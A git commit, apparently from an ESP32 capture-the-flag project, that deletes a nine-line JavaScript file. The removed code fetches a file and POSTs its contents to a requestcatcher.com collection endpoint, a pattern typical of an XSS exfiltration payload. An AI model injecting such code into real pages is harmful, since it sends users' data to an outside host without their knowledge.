7d32fc92a14041125bb191845066fba2a1ad75e6
UnlikeLemon <83449816+UnlikeLemon@users.noreply.github.com>
2021-10-25 14:32:53 -0700

    Delete js_script.js

--- js_script.js
+++
@@ -1,9 +0,0 @@
-var xhr = new XMLHttpRequest();
-xhr.open("GET", "https://raw.githubusercontent.com/UnlikeLemon/ESP32_SimpleCTF/master/js_script.js",true);
-xhr.send();
-v = xhr.responseText;
-
-xhr.open("POST", "https://lemon.requestcatcher.com/", true);
-xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-data = v;
-xhr.send(data);
